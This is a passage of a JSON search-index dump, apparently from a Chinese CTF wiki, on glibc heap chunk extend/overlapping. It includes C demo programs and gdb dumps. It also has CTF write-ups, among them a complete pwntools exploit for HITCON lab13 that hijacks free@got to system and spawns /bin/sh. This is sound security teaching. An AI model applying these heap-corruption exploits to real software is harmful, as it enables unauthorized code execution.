\u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f0x70\uff09 int main() { void *ptr,*ptr1; ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1 malloc(0x10); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2 malloc(0x10); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76 *(int *)((int)ptr-0x8)=0xb1; free(ptr); ptr1=malloc(0xa0); } \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548ctop chunk\u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2achunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0etop chunk\u9694\u5f00\u3002 0x602000: 0x0000000000000000 0x00000000000000b1 <===chunk1 \u7be1\u6539size\u57df 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000021 <=== \u9632\u6b62\u5408\u5e76\u7684chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk \u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165unsorted bin 0x602000: 0x0000000000000000 0x00000000000000b1 <=== \u88ab\u653e\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x00000000000000b0 0x0000000000000020 <=== \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) \u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9 0x4005b0 <main+74> call 0x400450 <malloc@plt> \u2192 0x4005b5 <main+79> mov QWORD PTR [rbp-0x8], rax rax : 0x0000000000602010","title":"\u57fa\u672c\u793a\u4f8b2\uff1a\u5bf9inuse\u7684smallbin\u8fdb\u884cextend"},{"location":"pwn/heap/chunk_extend_overlapping/#3freesmallbinextend","text":"\u793a\u4f8b3\u662f\u5728\u793a\u4f8b2\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684size\u57df\u3002 int main() { void *ptr,*ptr1; ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1 malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2 free(ptr);//\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin *(int *)((int)ptr-0x8)=0xb1; ptr1=malloc(0xa0); } \u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000091 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6211\u4eec\u9996\u5148\u91ca\u653echunk1\u4f7f\u5b83\u8fdb\u5165unsorted bin\u4e2d unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) 0x602000: 0x0000000000000000 0x0000000000000091 <=== \u8fdb\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <=== top chunk \u7136\u540e\u7be1\u6539chunk1\u7684size\u57df 0x602000: 0x0000000000000000 0x00000000000000b1 <=== size\u57df\u88ab\u7be1\u6539 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86chunk2 \u7684\u5185\u5bb9\u3002","title":"\u57fa\u672c\u793a\u4f8b3\uff1a\u5bf9free\u7684smallbin\u8fdb\u884cextend"},{"location":"pwn/heap/chunk_extend_overlapping/#chunk-extendshrink","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f\u53ef\u4ee5\u63a7\u5236chunk\u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 \u6b64\u5916\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u63a7\u5236chunk\u7684fd/bk\u6307\u9488\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528\u3002","title":"Chunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48"},{"location":"pwn/heap/chunk_extend_overlapping/#4extendoverlapping","text":"\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7extend\u8fdb\u884c\u540e\u5411overlapping\uff0c\u8fd9\u4e5f\u662f\u5728CTF\u4e2d\u6700\u5e38\u51fa\u73b0\u7684\u60c5\u51b5\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u5b9e\u73b0\u5176\u5b83\u7684\u4e00\u4e9b\u5229\u7528\u3002 int main() { void *ptr,*ptr1; ptr=malloc(0x10);//\u5206\u914d\u7b2c1\u4e2a 0x80 \u7684chunk1 malloc(0x10); //\u5206\u914d\u7b2c2\u4e2a 0x10 \u7684chunk2 malloc(0x10); //\u5206\u914d\u7b2c3\u4e2a 0x10 \u7684chunk3 malloc(0x10); //\u5206\u914d\u7b2c4\u4e2a 0x10 \u7684chunk4 *(int *)((int)ptr-0x8)=0x61; free(ptr); ptr1=malloc(0x50); } \u5728malloc(0x50)\u5bf9extend\u533a\u57df\u91cd\u65b0\u5360\u4f4d\u540e\uff0c\u5176\u4e2d0x10\u7684fastbin\u5757\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u7684\u5206\u914d\u548c\u91ca\u653e\uff0c\u6b64\u65f6\u5df2\u7ecf\u6784\u6210overlapping\uff0c\u901a\u8fc7\u5bf9overlapping\u7684\u8fdb\u884c\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0fastbin attack\u3002","title":"\u57fa\u672c\u793a\u4f8b4\uff1a\u901a\u8fc7extend\u540e\u5411overlapping"},{"location":"pwn/heap/chunk_extend_overlapping/#5extendoverlapping","text":"\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7\u4fee\u6539pre_inuse\u57df\u548cpre_size\u57df\u5b9e\u73b0\u5408\u5e76\u524d\u9762\u7684\u5757 int main(void) { void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 malloc(0x10);//\u9632\u6b62\u4e0etop\u5408\u5e76 free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//\u4fee\u6539pre_inuse\u57df *(int *)((long long)ptr4-0x10)=0xd0;//\u4fee\u6539pre_size\u57df free(ptr4);//unlink\u8fdb\u884c\u524d\u5411extend malloc(0x150);//\u5360\u4f4d\u5757 } \u524d\u5411extend\u5229\u7528\u4e86smallbin\u7684unlink\u673a\u5236\uff0c\u901a\u8fc7\u4fee\u6539pre_size\u57df\u53ef\u4ee5\u8de8\u8d8a\u591a\u4e2achunk\u8fdb\u884c\u5408\u5e76\u5b9e\u73b0overlapping\u3002","title":"\u57fa\u672c\u793a\u4f8b5\uff1a\u901a\u8fc7extend\u524d\u5411overlapping"},{"location":"pwn/heap/chunk_extend_overlapping/#hitcon-trainging-lab13","text":"","title":"HITCON Trainging lab13"},{"location":"pwn/heap/chunk_extend_overlapping/#_3","text":"\u279c hitcontraning_lab13 git: ( master ) file heapcreator heapcreator: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped \u279c hitcontraning_lab13 git: ( master ) checksec heapcreator [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/chunk_extend_overlapping/#_4","text":"\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u5668\uff0c\u6bcf\u4e2a\u5806\u4e3b\u8981\u6709\u4e24\u4e2a\u6210\u5458\uff1a\u5927\u5c0f\u4e0e\u5185\u5bb9\u6307\u9488\u3002\u4e3b\u8981\u529f\u80fd\u5982\u4e0b \u521b\u5efa\u5806\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u7533\u8bf7\u5bf9\u5e94\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5229\u7528 read \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u3002\u8fd9\u91cc\u957f\u5ea6\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u957f\u5ea6\u4e3a\u8d1f\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u53ef\u4ee5\u8fdb\u884c malloc\u3002\u6b64\u5916\uff0c\u8fd9\u91cc\u8bfb\u53d6\u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002 \u7f16\u8f91\u5806\uff0c\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u4ee5\u53ca\u4e4b\u524d\u5b58\u50a8\u7684\u5806\u7684\u5927\u5c0f\u8bfb\u53d6\u6307\u5b9a\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u8bfb\u5165\u7684\u957f\u5ea6\u4f1a\u6bd4\u4e4b\u524d\u5927 1\uff0c\u6240\u4ee5\u4f1a \u5b58\u5728 off by one \u7684\u6f0f\u6d1e \u3002 \u5c55\u793a\u5806\uff0c\u8f93\u51fa\u6307\u5b9a\u7d22\u5f15\u5806\u7684\u5927\u5c0f\u4ee5\u53ca\u5185\u5bb9\u3002 \u5220\u9664\u5806\uff0c\u5220\u9664\u6307\u5b9a\u5806\uff0c\u5e76\u4e14\u5c06\u5bf9\u5e94\u6307\u9488\u8bbe\u7f6e\u4e3a\u4e86 NULL\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/chunk_extend_overlapping/#_5","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528off by one \u6f0f\u6d1e\u8986\u76d6\u4e0b\u4e00\u4e2achunk \u7684 size \u5b57\u6bb5\uff0c\u4ece\u800c\u6784\u9020\u4f2a\u9020\u7684 chunk \u5927\u5c0f\u3002 \u7533\u8bf7\u4f2a\u9020\u7684 chunk \u5927\u5c0f\uff0c\u4ece\u800c\u4ea7\u751f chunk overlap\uff0c\u8fdb\u800c\u4fee\u6539\u5173\u952e\u6307\u9488\u3002 \u66f4\u52a0\u5177\u4f53\u7684\u8fd8\u662f\u76f4\u63a5\u770b\u811a\u672c\u5427\u3002 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './heapcreator' ) heap = ELF ( './heapcreator' ) libc = ELF ( './libc.so.6' ) def create ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit ( idx , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( content ) def show ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def delete ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"4\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) free_got = 0x602018 create ( 0x18 , \"dada\" ) # 0 create ( 0x10 , \"ddaa\" ) # 1 # overwrite heap 1's struct's size to 0x41 edit ( 0 , \"/bin/sh \\x00 \" + \"a\" * 0x10 + \" \\x41 \" ) # trigger heap 1's struct to fastbin 0x40 # heap 1's content to fastbin 0x20 delete ( 1 ) # new heap 1's struct will point to old heap 1's content, size 0x20 # new heap 1's content will point to old heap 1's struct, size 0x30 # that is to say we can overwrite new heap 1's struct # here we overwrite its heap content pointer to free@got create ( 0x30 , p64 ( 0 ) * 4 + p64 ( 0x30 ) + p64 ( heap . got [ 'free' ])) #1 # leak freeaddr show ( 1 ) r . recvuntil ( \"Content : \" ) data = r . recvuntil ( \"Done !\" ) free_addr = u64 ( data . split ( \" \\n \" )[ 0 ] . ljust ( 8 , \" \\x00 \" )) libc_base = free_addr - libc . symbols [ 'free' ] log . success ( 'libc base addr: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] #gdb.attach(r) # overwrite free@got with system addr edit ( 1 , p64 ( system_addr )) # trigger system(\"/bin/sh\") delete ( 0 ) r . interactive ()","title":"\u5229\u7528"},{"location":"pwn/heap/chunk_extend_overlapping/#2015-hacklu-bookstore","text":"","title":"2015 hacklu bookstore"},{"location":"pwn/heap/chunk_extend_overlapping/#_6","text":"\u279c 2015_hacklu_bookstore git: ( master ) file books books: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 3a15f5a8e83e55c535d220473fa76c314d26b124, stripped \u279c 2015_hacklu_bookstore git: ( master ) checksec books [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u8be5\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4e0e NX \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/chunk_extend_overlapping/#_7","text":"\u8be5\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8ba2\u4e66\uff0c\u5177\u4f53\u5982\u4e0b \u6700\u591a\u53ef\u4ee5\u8ba2\u8d2d\u4e24\u672c\u4e66\u3002 \u6839\u636e\u7f16\u53f7\u6765\u9009\u62e9\u8ba2\u8d2d\u7b2c\u51e0\u672c\u4e66\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u672c\u4e66\u6dfb\u52a0\u5bf9\u5e94\u7684\u540d\u5b57\u3002\u7136\u800c\u5728\u6dfb\u52a0\u540d\u5b57\u5904\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u6839\u636e\u7f16\u53f7\u6765\u5220\u9664 order\uff0c\u4f46\u662f\u8fd9\u91cc\u53ea\u662f\u5355\u7eaf\u5730 free \u6389\uff0c\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 use after free \u7684\u6f0f\u6d1e\u3002 \u63d0\u4ea4\u8ba2\u5355\uff0c\u5c06\u4e24\u672c\u4e66\u7684\u540d\u5b57\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u7531\u4e8e\u4e0a\u9762\u5806\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u51fa\u73b0\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u6b64\u5916\uff0c\u5728\u7a0b\u5e8f\u9000\u51fa\u4e4b\u524d\u5b58\u5728\u4e00\u4e2a \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u3002 \u8fd9\u91cc\u867d\u7136\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u80fd\u529b\u5f88\u5f3a\uff0c\u4f46\u662f\u6240\u6709\u8fdb\u884c malloc \u7684\u5927\u5c0f\u90fd\u662f\u5b8c\u5168\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u8fd9\u4e9b\u5206\u914d\u7684 chunk \u6765\u8fdb\u884c\u64cd\u4f5c\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/chunk_extend_overlapping/#_8","text":"\u7a0b\u5e8f\u4e2d\u4e3b\u8981\u7684\u6f0f\u6d1e\u5728\u4e8e\u5806\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5fc5\u7136\u9700\u8981\u6ea2\u51fa\u5bf9\u5e94\u7684dest \u6570\u7ec4\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b \u5229\u7528\u5806\u6ea2\u51fa\u8fdb\u884c chunk extend\uff0c\u4f7f\u5f97\u5728 submit \u4e2d malloc(0x140uLL) \u65f6\uff0c\u6070\u597d\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8ba2\u5355\u5904\u7684\u4f4d\u7f6e\u3002\u5728 submit \u4e4b\u524d\uff0c\u5e03\u7f6e\u597d\u5806\u5185\u5b58\u5e03\u5c40\uff0c\u4f7f\u5f97\u628a\u5b57\u7b26\u4e32\u62fc\u63a5\u540e\u6070\u597d\u53ef\u4ee5\u8986\u76d6 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002 \u901a\u8fc7\u6784\u9020 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u4e00\u65b9\u9762\u6cc4\u6f0f __libc_start_main_ret \u7684\u5730\u5740\uff0c \u4e00\u65b9\u9762\u63a7\u5236\u7a0b\u5e8f\u91cd\u65b0\u8fd4\u56de\u6267\u884c \u3002\u8fd9\u65f6\uff0c\u4fbf\u53ef\u4ee5\u77e5\u9053 libc \u57fa\u5730\u5740\uff0csystem \u7b49\u5730\u5740\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e\u4e00\u65e6 submit \u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u76f4\u63a5\u9000\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u6bd4\u8f83\u597d\u7684\u601d\u8def\u5c31\u662f\u4fee\u6539 fini_array \u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4fbf\u4e8e\u8fbe\u5230\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\u540e\uff0c \u91cd\u65b0\u8fd4\u56de\u6211\u4eec\u671f\u5f85\u7684\u4f4d\u7f6e \u3002\u8fd9\u91cc\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2atrick\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u8bfb\u53d6\u9009\u62e9\u7684\u65f6\u5019\u4f1a\u8bfb\u53d6 128 \u5927\u5c0f\uff0c\u5728\u6808\u4e0a\u3002\u800c\u7a0b\u5e8f\u6700\u540e\u5728\u8f93\u51fa dest \u7684\u65f6\u5019\uff0c\u4e4b\u524d\u6240\u8bfb\u53d6\u7684\u90a3\u90e8\u5206\u9009\u62e9\u5fc5\u7136\u662f\u5728\u6808\u4e0a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u6211\u4eec\u5728\u6808\u4e0a\u9884\u5148\u5e03\u7f6e\u597d\u4e00\u4e9b\u63a7\u5236\u6d41\u6307\u9488\uff0c\u90a3\u5c31\u53ef\u4ee5\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u518d\u6b21\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8986\u76d6 free@got \u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002 \u8fd9\u91cc\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u662f Fini_array0 : 5+8=13 __libc_start_main_ret : 5+0x1a=31\u3002 00:0000\u2502 rsp 0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov eax, 0 01:0008\u2502 0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000 02:0010\u2502 0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 03:0018\u2502 0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop rcx 04:0020\u2502 0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ('%sffffff') 05:0028\u2502 0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:') 06:0030\u2502 0x7ffe6a7f3ef8 \u2014\u25b8 0x9f2130 \u25c2\u2014 0x6564724f203a3220 (' 2: Orde') 07:0038\u2502 0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* '5\\n' */ 08:0040\u2502 0x7ffe6a7f3f08 \u25c2\u2014 0x0 ... \u2193 0b:0058\u2502 0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000 0c:0060\u2502 0x7ffe6a7f3f28 \u25c2\u2014 0x0 ... \u2193 0f:0078\u2502 0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* 'ttime' */ 10:0080\u2502 0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ('vdso_get') 11:0088\u2502 0x7ffe6a7f3f50 \u25c2\u2014 0x1 12:0090\u2502 0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add rbx, 1 13:0098\u2502 0x7ffe6a7f3f60 \u25c2\u2014 0x0 ... \u2193 15:00a8\u2502 0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 16:00b0\u2502 0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor ebp, ebp 17:00b8\u2502 0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1 18:00c0\u2502 0x7ffe6a7f3f88 \u25c2\u2014 0xd8d379f22453ff00 19:00c8\u2502 rbp 0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push r15 1a:00d0\u2502 0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov edi, eax \uff01\uff01\uff01\u5f85\u8865\u5145\uff01\uff01\uff01","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/heap/chunk_extend_overlapping/#_9","text":"2016 Nuit du Hack CTF Quals : night deamonic heap","title":"\u9898\u76ee"},{"location":"pwn/heap/fastbin_attack/","text":"Fastbin Attack \u00b6 \u4ecb\u7ecd \u00b6 fastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a \u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d \u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a Fastbin Double Free House of Spirit Alloc to Stack Arbitrary Alloc \u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528 free \u51fd\u6570\u91ca\u653e \u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk \uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539 fd \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528 malloc \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002 \u539f\u7406 \u00b6 fastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk 